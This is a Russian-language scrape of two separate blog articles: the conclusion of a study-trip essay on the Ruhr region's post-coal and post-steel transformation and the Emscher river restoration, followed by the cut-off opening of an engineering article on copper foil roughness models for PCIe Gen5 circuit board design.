Для восстановления разрушенной войной Европы требовалась уголь, кокс и сталь Рура. Поэтому во многом именно его тяжёлая промышленность, единый европейский рынок угля и стали, а также план Маршалла обеспечили немецкое послевоенное «экономическое чудо». Однако уже к середине 1950-х рост з/п и жизненного уровня шахтёров не позволял обеспечить другую, во многом противоположную цель создания ECSC — минимальную стоимость сырья для промышленности Европы. Нужно было либо вводить государственную поддержку (в ФРГ это сделали в 1956 г.) либо импортировать более доступный уголь. В условиях роста спроса на уголь, вызванного Суэцким кризисом, руководство ECSC совершило роковую ошибку, спрогнозировав сохранение спроса на уголь как ключевой энергоноситель следующего десятилетия. Некоторые видят в этом «уши» Франции, заинтересованной в ликвидации ресурсной базы своего злейшего врага. Так или иначе, но страны Западной Европы не только накопили огромные запасы, но и заключили долгосрочные контракты на импорт дешёвого угля из США. 

Всё бы ничего, но в 1958 г. в Рур протягивают нефте- и продуктопровод из Роттердама, и в регион хлынула ещё более дешёвая нефть из стран Персидского залива. На новый энергоноситель постепенно начинает переходить не только энергетический сектор и транспорт (речные суда и ж/д), но и химическая промышленность. У производителей угля, что в Германии, что во Франции, скопились запасы угля — он никому не нужен из-за доступного американского. В Руре начинают закрываться первые шахты, сначала старые и нерентабельные. Этому не придают особого значения, стремясь в горячке оптимизировать издержки угольной отрасли. Но это было начало Zechensterben — её смерти. В 1968 г. уцелевшие шахты объединяют в отраслевой союз Ruhrkohle AG — следующие полвека их добычу будет субсидировать государство. В итоге, если на пике в 1957 г. из угля вырабатывалось 72% электроэнергии Германии, то сегодня лишь 17%. Число шахтёров упало с 0,5 млн до 3,4 тыс. человек к 2018 г., когда в Руре закрылась последняя из 136 шахт и весь энергетический уголь стал импортироваться из Китая и Австралии. 

Два примера успешного редевелопмента бывших промышленных площадок Рура. Источник: Stefan Moellerherm, Georg Agricola Research Center of Post-Mining

Что касается металлургического комплекса, то оккупационная администрация союзников поначалу стремилась максимально снизить его потенциал, разрушив часть предприятий. Но образование ECSC наряду с постепенным переходом на новые способы производства позволило ФРГ, напротив, нарастить производство стали практически в 4 раза ко времени нефтяного кризиса 1973 г. и последующего за ним стального. Его причиной стал не только рост конкуренции со стороны Японии, но и снижение спроса на сталь из-за новых конструкционных материалов типа алюминия, пластика и керамики. Как и в случае с угольным кризисом, осознания, что меняется целая эпоха, не произошло — старались всё списать на флуктуации рынка. Значимой государственной поддержки стремительно теряющие конкурентоспособность металлургические конгломераты Рура тогда не получили. И если после угольного кризиса в 1960-х гг. увольняемых шахтёров переучивали на металлургические специальности, чтобы трудоустроить здесь же, то теперь и этот сектор залихорадило. Для некогда индустриального сердца Европы замаячил призрак деиндустриализации. Оставшиеся сегодня металлургические предприятия сконцентрированы в Дуйсбурге на Рейне, для предельного снижения транспортных издержек. 

▍ 2.2 Почему Рур смог: уроки для Детройта 
Мы приехали в Дортмунд под впечатлением от пережитого в Детройте (см. материал по нему) и, конечно, наш первый вопрос был, как Руру удалось избежать его судьбы. На это наши профессора отвечали в том ключе, что, во-первых, говорить о полном успехе не корректно. Сервисная экономика 1990-х гг. заместила выбывшие рабочие места после коллапса тяжёлой промышленности не полностью. Так, к 2001 г. Рур потерял 840 тыс. рабочих мест (80%), а новых удалось создать около 800 тыс. Что само по себе отлично, но есть нюансы. В регионе сохраняется структурная безработица в 10-12%, что в два раза выше, чем по Германии в целом. Социальный кризис удалось растянуть по времени, дав возможность развиться новым отраслям, только благодаря масштабному субсидированию угольной отрасли. С момента начала угольного кризиса в 1958 г. до закрытия последней шахты Рура в 2018 г. на это и борьбу с техногенными последствиями было потрачено 130 млрд Евро (оценки 2012 г.). В целом, ВВП на душу населения и располагаемых домохозяйствами доход в Руре продолжают падать, оставаясь самыми низкими для федеральной земли и Германии в целом. Поэтому предстоит много работы, а муниципальный дефицит ещё долго будет покрываться трансферами из бюджета федеральной земли.

Во-вторых, чтобы сохранить инженерные кадры в Руре стали развивать высшее образование. Вообще, с XIX в. власти Пруссии, боясь революций и объединения интеллигенции, рабочих и военных, запретили здесь университеты. Но с началом угольного, а потом и стального кризиса они начали появляться здесь как грибы после дождя. Показательно, что в год закрытия последней шахты в Дортмунде там открыли технический университет, который сегодня является одним из крупнейших работодателей. При этом традиционно сильные для Европы профсоюзы (8-часовой рабочий день с 1905 г.) добились поддержки увольняемых шахтёров. Она принимала не только форму выплат ежемесячных пособий до достижения пенсионного возраста, но и переобучения с гарантией последующего трудоустройства. И если в 1950-х гг. программы профессиональной переподготовки шахтёров предлагали только специальности в смежных секторах, то сегодня в Руре сформировался один из крупнейших университетских кластеров Европы (22 университета с более 250 тыс. студентами). Он предлагает широкий спектр специальностей, от энергетики и логистики до ИКТ и здравоохранения. Развитие сферы R&D и центров трансферта технологий позволило сформировать здесь национальный центр экологических компетенций. В этой сфере созданы почти 130 тыс. рабочих мест (солнечная и водородная энергетика, технологии очистки воды и защиты почвы, переработка отходов и прочее). А вот надежды на логистику как отрасль, способную стать новой якорной специализацией Рура и в инфраструктуру которой вкладывались десятилетиями, оправдались не в полной мере. В итоге первое место по занятости в Руре, пусть и с незначительным отрывом от промышленности, сегодня занимает здравоохранение.


Источник: Hermann Bömer, University of Dortmund

В-третьих, ключевые проекты редевелопмента 1990-2000-х гг. разрабатывались в Руре на уровне конкретных муниципалитетов и аккумулировались через ассоциацию RVR. А федеральная земля NRW уже «выбивала» под них проектное финансирование у Берлина и Евросоюза. Такое выстраивание цепочки взаимодействия «снизу-вверх» отличается от противоположного подхода к восстановлению старопромышленных регионов в США. Однако к этому пришли не сразу — первая федеральная Ruhr Development Program 1968 г. всё ещё пыталась «сверху» спасти обречённую угольную и металлургическую промышленность через инвестиции в инфраструктуру, модернизацию и оптимизацию издержек, а также консолидацию. При этом стремление Бонна начать развитие здесь новых отраслей наталкивалось на сопротивление «снизу» — владельцы закрываемых шахт опасались исков будущих владельцев участков из-за возможного ущерба вследствие продолжающегося проседания почвы. С другой стороны, гиганты тяжёлой промышленности ещё не понимали, что их золотой век закончился. Характерна фраза, которой Густав Крупп ответил на предложение развивать в Руре высшее образование: «Нам здесь нужны мускулы, а не мозги». Однако к концу 1980-х гг. уже до самых упёртых дошло, что перемены неизбежны. Именно в рамках принятой тогда программы The Future Initiative for Coal and Steel Regions был создан IBA Emscher Park вдоль речушки Эмшер, о которой я расскажу ниже. Ландшафтный парк протяжённостью 85 км позволил за 10 лет реализовать более 100 различных проектов муниципалитетов по редевелопменту территории бывших промышленных площадок. 

Ну и, наконец, здесь не было расового и политического противостояния как в Детройте. Хотя национальный вопрос в Руре стоит, пусть и не столь остро — на 2010 г. здесь было около 600 тыс. (10%) иностранных рабочих, 40% которых были выходцами из Турции (gastarbeiter, кстати, словечко немецкое). Их появление в Германии связано с быстрым ростом местных з/п в былые времена ФРГ. Если в 1954 г. их доля среди занятых составляла 0,4%, то в 1971 г. уже более 10%. В угольной отрасли к началу 1980-х гг. она вообще доходила до 50%. Не трудно догадаться, что именно среди национальных диаспор сегодня самый высокий уровень безработицы в Руре с вытекающими отсюда последствиями. Так, в Гельзенкирхене, который позиционирует себя как столица солнечной энергетики, и где самая высокая в регионе доля мигрантов (19%), и самый высокий уровень безработицы (15,6%).

▍ 2.3 Рурский бассейн один — дороги разные 
На пике расцвета тяжёлой промышленности в 1960 г. в Дортмунде на этих предприятиях работало 75 тыс. человек. К моменту закрытия последней шахты (1987) и последнего металлургического предприятия (1997 г.) безработица достигла 18%, а Дортмунд приобрёл незавидную славу умирающего рабочего города без будущего. Чтобы переломить тренд, муниципалитет разработал стратегию развития (dortmund-project), которая частично была профинансирована ThyssenKrupp, крупнейшим работодателем региона. Она базировалась на развитии в городе новых секторов, прежде всего ИКТ, электронной коммерции и логистики, микросистемного инжиниринга. Её результаты видны по постепенному росту числа рабочих мест к 2019 г. — с 280 до 333 тыс. (+20%). Больше всего их было создано в логистике (+ 20 тыс.), только потом шли «новички: ИКТ (+8 тыс.), наука и образование с центрами трансферта технологий (прирост числа занятых в 4,4 раза), а также сектор финансовых услуг (рост в 2,4 раза). 

Что касается Дуйсбурга, то здесь ещё сохраняются металлургические предприятия со специализацией в производстве высоколегированных сталей. Так как город на Рейне здесь приоритетное развитие получила именно логистика, с опорой на традиционно развитую для Рура транспортную инфраструктуру. Сегодня через речной порт Дуйсбурга идёт до 30% грузов между Китаем и Европой, а число занятых в секторе выросло в 2,5 раза, до 50 тыс. человек. Кроме того, широкое распространение здесь получили различные образовательные программы по профессиональной подготовке/переподготовке в сфере логистики. Для диверсификации экономики были приняты программы Duisburg 2000 и Impulse.Duisburg. Как и в Дортмунде, приоритетными сферами определили ИКТ, а также материаловедение, туризм и сектор услуг. Но они оказались менее успешными, критики справедливо указывают на их размытый фокус. 


Источник: Wuppertal Institut für Klimat & RVR/Emscher Landscape Park

А вот в Эссене, третьем крупном городе конурбации, основную ставку сделали на редевелопмент промышленных площадей под офисы, развитие зелёной инфраструктуры и промышленный туризм. Крупнейшая местная угольная шахта и коксохимический завод Zeche Zollverein в 2001 г. была признана Unesco объектом всемирного наследия, став крупным музеем индустриального наследия. Рядом с Эссеном располагается и знаменитый Duisburg-Nord landscape park площадью 180 Га на месте бывшего чугунолитейного завода, где можно гулять между гигантскими домнами, заниматься промышленным альпинизмом или дайвингом в газгольдере. В итоге в 2010 г. Эссен получил звание зелёной столицы Европы, здесь проводится крупный ежегодный культурный фестиваль ExtraSchicht. Всё это привлекает туристов, муниципалитет поставил себе цель в 0,5 млн человек в год (в 2019 г. Рур посетили более 4,4 млн туристов, треть из них иностранцы). Кроме того, в Эссене развивается водородный кластер, здесь размещается одна из штаб-квартир ThyssenKrupp, а также энергетические компании STEAG, OGE, E.ON и RWE. Именно в Эссене расквартирована региональная ассоциация RVR, в итоге город по объёму офисных площадей сегодня борется за титул Desk of the Ruhr с самим Дюссельдорфом. 

Между тем, именно в столице федеральной земли NRW, наряду с агломерацией Кёльн – Бонн самые высокие показатели ВРП на душу населения в Triple Metropolis. Бросается в глаза разницам между «альфой и омегой» Рейнско-Рурского региона со старопромышленными городами Рурштадта. Поэтому некоторые исследователи с начала 2000-х гг. стали ставить под сомнение само существование Triple Metropolis как единого социально-экономического и рынка труда, считая его искусственным политическим конструктом. 

Источник: Robert Hassink & Matthias Kiese, Kiel University & Ruhr University Bochum (2021)

3. Борьба с последствиями индустриального прошлого (post-mining)
▍ 3.1 Проседание почвы, откачка воды, терриконы и ржавеющие развалины 
С начала индустриализации Рура здесь было добыто около 7 млрд тонн угля, что вызвало масштабное проседание почвы, средний уровень которой составляет 3 м, а местами доходит и до 20 м. В итоге 40% территории Рура теперь относятся к антропогенным низменностям (польдеры), откуда нужно постоянно откачивать воду, чтобы их не затопило поверхностными стоками. Для этого в регионе работает целая сеть из более 180 насосных станций, мощность которых постоянно растёт. Но это ещё не всё. Грунтовые воды нужно откачивать ещё и из самих шахт. В своё время именно высокая обводнённость угольных шахт Рура и необходимость постоянной откачки грунтовых вод стала одной из причин потери конкурентоспособности сектора на открытом мировом рынке. Теперь, после закрытия шахт, нужно контролировать уровень воды в них, чтобы избежать смешения получающейся высокоминерализованной воды с грунтовыми водами. В случае превышения заданного уровня её откачивают, а там, где это делается на постоянной основе, используют как источник геотермальной энергии (температура 35-40 градусов). В исследовательском институте пост-угольной эры TH Georg Agricola University (THGA) сейчас разрабатывают технологию разделения шахтных вод на чистые и солевые растворы. 

Согласно German Federal Mining Act, деятельность владельца шахты не заканчивается с её закрытием — он должен разработать план рекультивации территории, а после одобрения ещё и обеспечить его реализацию. При этом большая часть территории бывших шахт перешла в собственность Ассоциации RVR и уже прошла рекультивацию с озеленением, став общественными парками. На терриконах размещают поля солнечных батарей и ветровые турбины, в отдельных случаях они приобретают другие специфические функции, как, к примеру, круглогодичная лыжная трасса в Ботропе. Важно и то, что принятый Renewable Energy Sources Act (EEG) в 2000 г. приравнял метан угольных пластов (coal mine methane, CMM) к возобновляемым ресурсам. Поэтому на части закрытых шахт начали устанавливать модульные мини ТЭС, варьируя число типовых блоков мощностью около 1,3 МВт в зависимости от выхода газа. Проблема в том, что многие шахты связаны между собой под землёй, поэтому газ из более загазованных шахт часто разбавляется воздухом менее загазованных. В итоге постепенно концентрация метана снижается, что влияет на эффективность таких проектов. 


Основные проблемы пост-угольной эры в Руре. Источник: Stefan Moellerherm, Georg Agricola Research Center of Post-Mining

Что же касается многочисленных заброшенных промышленных площадок Рура, часто превращаемых в музеи и объекты индустриального наследия, то это было вынужденным решением. Целые металлургические заводы, что были относительно новыми и которые можно было разобрать — вывезли в Китай. Так, к примеру, произошло с заводом Phoenix в Дортмунде, о котором я расскажу ниже. В отдельных случаях не столь грязных производств удаётся реализовать проекты редевелопмента. К примеру, шахта Ewald в Хертене, территория которой после рекультивации стала частью ландшафтного парка Hoheward или технопарк MARK 51°7 на месте автозавода Opel в Бохуме. А вот загрязнение почвы и материалов конструкций домен, коксовых батарей, газометров или шахтных построек старых объектов Рура за практически два века индустриализации сделало их разбор и рекультивацию территории для последующего использования чрезвычайно затратным. Было проще оставить всё как есть, законсервировав. Отсюда и развитый промышленный туризм в Эссене (как грустно шутили наши профессора — приезжают в музей под открытым небом богатые китайцы посмотреть на ржавые развалины). Другое дело, что поначалу муниципалитетам Рура было сложно убедить обычных работяг в нужности таких заброшенных промплощадок — после массовой потери рабочих мест бытовало отношение «да гори оно теперь всё пропадом». 

▍ 3.2 Речушка Эмшер: путь от «клоаки Рура» стоимостью $5,5 млрд 
В 1989 г. в Руре приняли программу International Building Exhibition (IBA) Emscher Park как стратегический проект экологической и социально-экономической трансформации региона. За 10 лет удалось реализовать около 120 проектов рекультивации территорий различных промышленных объектов на всём протяжении реки Эмшер общей стоимостью 2,5 млрд Евро. Их связали в единую систему общественных парков общей площадью 320 км2. Однако важнее всего было оживить саму речушку Эмшер, восстановив её естественное русло и окружающий природный ландшафт, на что в итоге ушли следующие 30 лет и ещё $5,5 млрд. Для того, чтобы понять, почему это было так сложно сделать, нужно снова обратиться к истории индустриализации Рура. 

Бетонный канализационный коллектор Эмшер. Источник: Emschergenossenschaft

Эмшер — одна из трёх рек Рурского бассейна, у которой было петляющее русло и многочисленные старицы, а ширина поймы в отдельных местах доходила до 8 км. С конца XIX в. она использовалась для сброса бытовых и промышленных стоков. Чтобы избежать эпидемий из-за её постоянных разливов, масштабы которых постоянно росли (просадка почвы под шахтами), её русло спрямили, углубили и заключили в бетонный коллектор, заодно отделив от судоходного канала Rhine-Herne. Просадка почвы продолжалась, высоту дамбы Эмшер постоянно наращивали, воду из притоков туда пришлось поднимать насосами. Для очистки бытовых и промышленных стоков в 1977 г. в Динслакене, при впадении Эмшер в Рейн, был открыт мощный комплекс водоочистных сооружений. В целом, получившееся гидротехническое сооружение сносно справлялось со своими задачами, хотя о комфорте проживания по её берегам можно было забыть. В народе как только многострадальную речушку ни называли, и cloaca maxima было самым литературным.

Однако нет худа без добра. Из-за коллапса угольной промышленности и закрытия шахт к началу 1980-х гг. проседание почвы в Рурском бассейне практически прекратилось. Стало, наконец, возможным, строительство обычного подземного канализационного коллектора. И в 1991 г. Emschergenossenschaft решилось на масштабный проект реконструкции канализационной системы Рура. Для начала нужно было создать и проложить сеть подземных коллекторов раздельной ливневой и бытовой канализации под самой Эмшер и её притоками общей протяжённостью более 400 км. Параллельно шла постройка сразу нескольких комплексов очистных сооружений (КОС), на которые к 2001 г. замкнули канализационные стоки. Для вывода в Рейн очищенных стоков всей конурбации КОС соединили магистральным подземным коллектором длиной 51 км и диаметром до 2,8 м. Это масштабное строительство продолжалось около 20 лет. Мы были в Дортмунде в 2018 г. и успели походить по шахтам насосных станций и строящимся тоннелям. Сейчас вся система уже заработала. 



Параллельно, по мере высвобождения поверхностного коллектора Эмшер от канализационных стоков, его по отдельным участкам начали разбирать и восстанавливать естественное русло, где это было возможно. Здесь тоже было много трудностей. Естественное русло Эмшер не обладает усреднёнными характеристиками прежнего бетонного коллектора — водосток живой реки «гуляет» в пределах от 11 м3/с в засуху до 350 м3/с при продолжительных ливнях. Поэтому без «серой» инфраструктуры не обойтись — от масштабных наводнений антропогенный польдерный ландшафт Рура теперь всегда будут спасать только дамбы и насосы. Но сгладить колебания водостока Эмшер можно. Для этого ливневые стоки стараются собирать и удерживать в пойме Эмшер с помощью системы воссозданных болот, запруд и каналов. С этой же целью в Дортмунде на месте бывшего завода Phoenix создали одноимённое озеро (Lake Phoenix) объёмом 600 тыс. м3.

До этого Эмшер протекала в подземном коллекторе под заводом. После его закрытия быстро стал ветшать и весь район. Чтобы вдохнуть в него новую жизнь и создать большой водосборный бассейн для регулирования стока Эмшер, приняли решение создать на его месте искусственное озеро, а участки по берегам отдать девелоперам под застройку и технопарк. Территория общей площадью 36 Га стала частью ландшафтного парка Эмшер. К разборке заводских корпусов и демонтажу оборудования приступили в 2004 г., а закончили всё, открыв новое общественное пространство для посетителей в 2011 г. Наши профессора рассказывали, что в пиковые жаркие летние дни число посетителей доходит до 25 тыс. На 10-30%, в зависимости от удалённости от реновационного проекта, выросла стоимость недвижимости в районе. Это позволило частично компенсировать затраты (~ $300 млн). Озеро Phoenix стало частью масштабного проекта ревитализации Эмшер, который растянулся на долгие 20 лет, за что был прозван generation project. Он позволил создать 44 тыс. новых рабочих мест. Это к вопросу о том, что экологические проекты, как и инвестиции в модернизацию ЖКХ, могут быть не только «чёрными дырами», но и драйверами развития целых отраслей и регионов. 



 Вместо заключения
Такова история этого удивительного региона, сумевшего после коллапса угольной и металлургической промышленности, а также потери 0,8 млн рабочих мест отскочить от края пропасти. Касками по брусчатке там, конечно, не стучали, — давал о себе знать «рейнский капитализм» с тесной работой профсоюзов и менеджмента. Но и организованное сопротивление было — чего только стоят недельные протесты десятков тысяч шахтёров против сокращения субсидирования  с оккупацией Бонна в 1997 г. В итоге масштабная финансовая помощь центра помогла растянуть негативные последствия кризиса во времени, дав шанс на развитие замещающих секторов. Да, за полвека мучительной трансформации Рур потерял 10% населения, а уровень структурной безработицы здесь в два раза выше, чем в среднем по Германии. Но общий настрой местных обнадёживает — они сделали то, что не удалось Детройту, да и в целом США с их «социальным дарвинизмом». Именно настрой помогает видеть сегодня новые возможности в, казалось бы, очевидных негативных вещах. Так, в Руре «утечку мозгов» назвали экспортом образовательных услуг, а растущая доля мигрантов вызвала рост новой сферы этномаркетинга (покупать свадебные платья в Duisburg Marxloh съезжаются турецкие девчонки со всей Европы). 

Помню, как мы спросили нашего принимающего профессора после лекции на свежем воздухе, а где же его авто. Тот невозмутимо буркнул, что приехал к нам на велике, — стоит тут за углом. Сразу же вспомнился профессор из Нью-Йорка (см. материал по нему), который на предложение моего научника проехаться на метро, брезгливо скривился. Именно в таких мелочах выражается zeitgeist, «дух места». Думается, что помимо прочего, он помог Руру стать одним из немногих примеров структурной трансформации старопромышленных регионов, коих немало на нашей планете… Есть они и у нас. И, конечно, до рези в глазах хочется, чтобы они также смогли преодолеть трудности перелома эпох, вновь встали крепко на ноги. Будем работать для этого и дальше! 

P.S. Этот материал стал последним в серии публикаций по итогам учебных модулей программы IGLUS. Крайне жаль, что она почила в лету во время глобального локдауна, будучи основанной на field trips и жизни в изучаемых городах. Но весь полученный опыт лёг в основу материалов (надеюсь, не очень скучных), поэтому я очень рад, что всё-таки смог довести серию до конца… Прощаться не буду, возможно, захочется рассказать о чём-то ещё. Stay tuned! И удачи всем нам!

Скидки, итоги розыгрышей и новости о спутнике RUVDS — в нашем Telegram-канале 🚀",2024-01-26
Обзор подходов к проблеме шероховатости фольги при проектировании высокоскоростных плат,22,0,https://habr.com/ru/companies/yadro/articles/788928/,"На работу высокоскоростных интерфейсов в печатных платах влияют множество параметров: свойства препрега и ядра, температура разложения материалов, тангенс угла диэлектрических потерь и шероховатость медной фольги. Вклад последней в общую картину потерь целостности сигналов может быть довольно существенным, в чем мы далее убедимся. Для снижения потерь применяют специальные модели влияния шероховатости фольги: они позволяют получать лучшие результаты на производстве, сократить время на разработку и повысить показатели надежности изделия.Меня зовут Петр Беляев, я старший системный архитектор в YADRO. Один из многочисленных аспектов деятельности команды, в которой я работаю, — проектирование многослойных высокоскоростных печатных плат. В статье я расскажу о моделях влияния шероховатости фольги на высокочастотные потери в проводнике и приведу пример их применимости при разработке серверной материнской платы, целевой процессор которой поддерживает PCIe Gen5. Но сначала дам контекст, который подробнее ответит на вопрос о том, зачем это все нужно.ПредисловиеСреди вызовов в разработке высокоскоростных цифровых плат особого внимания заслуживают следующие:Электромагнитная совместимость (EMC, или Electromagnetic Сompatibility).Целостность питания (PI, или Power Integrity).Целостность сигналов (SI, или Signal Integrity).Представим, что случай у нас относительно простой: все чипы и их решения по питанию хорошо изучены и отхарактеризованы, а для закрытия вопроса ЭМС достаточно следовать лучшим практикам и не делать тривиальных ошибок. Иными словами, «гигиенические» факторы нас пока что не беспокоят и фокусироваться мы будем на проблеме целостности сигналов. Чтобы остаться в формате небольшой статьи, придется сделать несколько важных допущений. А именно:Мы ограничимся только интерфейсом PCIe, так как на основании спецификации PCIe легко составить ограничения при проектировании топологии шины.Мы ограничимся только теми участками топологии, которые контролируем при проектировании печатной платы, то есть одним сегментом физического канала. Это допущение хочется сделать, чтобы оградить себя от таких вещей, как FFE/CTLE/DFE, кабелей и прочих интересных, но нерелевантных в контексте статьи нюансов.Мы не берем в рассмотрение температурные зависимости любых параметров и производственные допуски на них.Мы не рассматриваем проблему перекрестных помех.Спецификация PCIe говорит, что в рамках процедур валидации приемника должен использоваться калибровочный канал с номинальной величиной SDD21, равной -36 дБ. Это означает, что при проведении калибровки лишь 0.025% сгененированной передатчиком энергии доходит до приемника, при этом приемнику позволено ошибочно определить лишь один бит из триллиона:Приведенная величина SDD21 не является нормативной, но несмотря на это часто используется в системном дизайне как некий ориентир, дающий простое представление о допустимой совокупной длине тракта и степени затухания сигнала в тракте.Стоит сказать, что в реальности SDD21 не является мерой именно затухания, так как часть энергии отразится обратно в порт 1, не дойдя до порта 2. Для характеристики отражений используется величина SDD11, однако и она не характеризует одни лишь отражения, поскольку отраженная волна претерпевает затухания. Тем не менее, чтобы исключить эту сложность из нашей картины, будем считать, что величина SDD11 предельно мала в абсолютном выражении и что величина SDD21 обусловлена исключительно затуханиями в тракте.Теперь проведем декомпозицию SDD21 с учетом всех принятых ранее допущений. Для этого возьмем абстрактную геометрию дифференциальной пары в абстрактном стеке и модель шероховатости, которую используемый софт (в данном случае Polar) предлагает по умолчанию. На выходе получаем следующую картину:В сетапе используется дифференциальная пара длиной 10 дюймов, шероховатость учтена для слоев проводника и опоры. Естественно, она разная для меди, обращенной в сторону ядра и препрега.Разница между синим и бирюзовым графиками показывает вклад шероховатости. Несмотря на то, что сетап состряпан «на коленке» и использованные в нем числа совпадают с реальными разве что порядком, мы можем констатировать, что вклад шероховатости в общую картину потерь как минимум достоин отдельного рассмотрения.Общая стратегияДля начала попробуем разобраться в том, с какой стороны подходить к обозначенной проблеме и почему она вообще является проблемой. Следующая диаграмма может иметь очень широкую применимость. Она грубо отражает путь, который можно проделать от постановки задачи до ощутимых практических результатов. Итак:Представленный процесс, разумеется, не является догмой. Он может быть значительно сложнее или проще в зависимости от того, насколько дороги сопутствующие риски. А теперь раскроем каждый этап процесса, чтобы видение превратилось в стратегию.Техническое заданиеВ нашем случае вопрос технического задания стоит достаточно просто. Тот факт, что в рассматриваемом синтетическом кейсе применяется технология PCIe, может быть отражен в техническом задании в виде требования соответствия базовой спецификации PCIe. Все остальное (включая, естественно, методику испытаний) вытекает из этого требования.Остальные нюансы мы намеренно опускаем, на что имеем право за счет сделанных ранее допущений.ИсследованиеТеперь нужно определить, какие аспекты потребуют дополнительного внимания, то есть ответить на вопрос: «Что наиболее важно для выполнения поставленной задачи?». Некоторые кандидаты были упомянуты нами ранее: целостность питания, ЭМС, целостность сигналов. Уделив особое внимание вопросу целостности сигналов (и в частности — величине SDD21), мы обнаружили, что шероховатость играет в этом вопросе далеко не последнюю роль.Мы в первом приближении прикинули, где недостаточно грубых качественных оценок — и шероховатость вошла в «почетный список» нюансов, которые мы хотели бы в больших подробностях учесть на этапе моделирования. Разумеется, пока только на правах гипотезы.Почему проблема является проблемой, мы поняли именно на этом этапе. Дальше будем постепенно отходить от абстрактного контекста к актуальному.МоделированиеТеперь нам необходимо составить модель системы. В нашем простом случае речь идет об одной дифференциальной паре. Наша цель — выяснить ее максимальную длину, чтобы удовлетворить требованиям по SDD21. В идеальном мире результаты этого этапа претендуют на хорошую степень достоверности, так как сетап уже не составляется «на коленке», а учитывает целую мириаду факторов. В реальности сам процесс моделирования, строго говоря, состоит из нескольких итераций, хотя мы этого намеренно не показываем. Здесь мы можем учитывать вариации температуры, производственные допуски, можем играться с параметрами стека будущей платы и много с чем еще. В результате получаем набор ограничений и правил, который является вводным для следующего этапа — непосредственной имплементации топологии.Здесь же мы можем с большей уверенностью понять, насколько важны те или иные параметры моделируемого объекта (дифференциальной пары) за счет проведения анализа чувствительности к изменениям этих параметров. И здесь же можем понять, так ли важно учитывать ту же шероховатость. Но предположим, что все-таки важно и что поставленная нами в ходе исследования гипотеза подтвердилась.Естественно, вопрос выбора модели шероховатости является на этом этапе очень важным и ответственным. Нетрудно догадаться, что цена ошибки на этапе моделирования может оказаться ощутимо высокой. При существенных различиях между моделью и реальностью в экстремальном случае может потребоваться пересмотр всего дизайна, а в некоторых случаях — и концепции устройства, особенно если заложить низкий уровень запаса по ключевым характеристикам. Львиная доля дальнейшего повествования будет именно о выборе модели шероховатости, но пока перейдем к следующему этапу, чтобы не терять нить.ДизайнВ контексте разработки топологии печатной платы «дизайн» — итеративный процесс работы схемотехника и тополога (часто — нескольких топологов). Результатом процесса, очевидно, является топология печатной платы, пригодная для дальнейшей верификации — с отсутствием грубых и очевидных нарушений, и проверенная топологом и схемотехником, что называется, на свежую голову.Интересно, что в реальности почти никогда не получается попасть в рамки всех выведенных на более ранних этапах ограничений. В процессе всегда возникают различные «тонкие» места и необходимость компромиссов. По этой причине, а также потому, что ранее разработанная модель не является идеальной, необходим следующий этап — к нему и переходим.ВерификацияВ самых общих терминах верификация нужна, чтобы продемонстрировать жизнеспособность дизайна перед его отправкой на производство. Здесь мы получаем первый явно выраженный и потенциально болезненный цикл — результаты верификации могут являться основанием для пересмотра дизайна. Поскольку мы ранее ввели огромное число допущений, мы можем сказать, что на выходе из процесса верификации нас интересует исключительно SDD21.Верификация обычно проводится для самого «запущенного» случая — например, самой длинной дифференциальной пары в топологии платы. Для большинства плат такой подход является разумным компромиссом между рисками и ресурсозатратами. После успешного завершения процесса верификации мы отдаем данные платы на завод вместе с набором технических требований, например, по шероховатости. До получения готовой платы с завода происходит немало процессов, которые в том числе могут привести к дополнительной цикличности, но эти нюансы мы затрагивать не будем. Представим, что мы уже все получили либо завод получил первые образцы у себя, и перескочим к следующему этапу.ХарактеризацияСуть характеризации заключается в измерении свойств изучаемого объекта, коим в нашем случае является дифференциальная пара. Этот этап выступает звеном обратной связи, чтобы мы могли убедиться, что выбранная ранее модель корректно описывает объект и/или его поведение.В простейшем случае в рамках процесса характеризации производится проверка соответствия предсказаний модели (SDD21 для дифференциальной пары определенной длины) и результатов измерений. В случае несоответствия и при корректной постановке эксперимента (корректное исключение оснастки, обработка результатов и т. п.) у нас появляются основания для корректировки модели. Также полученные на этом этапе данные позволяют более точно ставить гипотезы на этапе валидации (испытаний).Ошибки на этапе характеризации еще опасней, чем при моделировании, так как из-за них можно пойти в кардинально неверном направлении на следующей итерации процесса разработки. В конечном итоге при накоплении ошибок на разных этапах продолжение разработки может перестать быть коммерчески оправданным, что в общем-то означает «смерть» проекта.ВалидацияВалидация, она же QA, она же испытания, — это комплекс мероприятий, который в общем случае призван убедиться, что:Устройство соответствует техническому заданию (в идеальном мире).Устройство функционирует с определенной производительностью в диапазоне внешних условий (когда ТЗ как такового нет, но есть представление, что должно быть «не хуже чем...»).Если наблюдаемая на этом этапе реальность не соответствует ожиданиям, важно правильно поставить гипотезу о причинах отклонения и по возможности провести проверку выдвинутой гипотезы. Неверный техпроцесс или неверно подобранный тип фольги (повышенная шероховатость является последствием и того, и другого) могут:Быть причиной повышенного SDD21 и невозможности достичь нужных скоростей передачи данных.Привести к нестабильности показателей производительности: работает в двух произведенных платах из десяти, работает в недостаточно широком диапазоне температуры или влажности и т. п.Валидация, обработка ее результатов и принятие решений на ее основе — чрезвычайно сложный процесс. Это обусловлено охватом самой процедуры — мы буквально проверяем все, что поддается проверке. В нюансы вдаваться не будем, но обеспечение тестируемости и обеспечение тестового покрытия в том числе на этапе разработки архитектуры (DFT, или Design for Testability) — отдельная история. Предположим, что мы заранее обеспечили тестируемость и локализуемость всего или почти всего, что может быть нам интересно.Подробнее о тестировании сложных аппаратных комплексов и DFT читайте в статье моего коллеги Антона Смоленского.В ходе валидации высокоскоростных интерфейсов мы имеем возможность оценить «открытость» глазковой диаграммы интерфейса и проверить ее на предмет соответствия требованиям соответствующих спецификаций. При неудовлетворительных результатах валидации проблемы с шероховатостью могут быть одной из рабочих гипотез. А за счет проведенной ранее характеризации соответствующие гипотезы можно выдвигать со значительно большей уверенностью.Промежуточное резюмеИтак, мы наконец-то получили ответ на вопрос «зачем?». Очень краткий итог всего пройденного на данный момент:Шероховатость медной фольги в печатной плате оказывает влияние на работу высокоскоростных интерфейсов.Чтобы учитывать это влияние, необходимо выбрать модель, адекватно описывающую само явление.Чтобы понять, что потенциальные проблемы сводятся к шероховатости, нужно обеспечить характеризуемость итоговой структуры линии передачи и локализуемость причин этих потенциальных проблем.Сосредоточимся теперь на стадии моделирования и в частности на выборе модели. Рассмотрим популярные модели влияния шероховатости на высокочастотные потери в проводнике.Краткий обзор моделейМодели, описывающие влияние шероховатости на высокочастотные потери, которые мы будем рассматривать, условно делятся на феноменологические (это не совсем эмпирические, так как эмпирическим, строго говоря, не 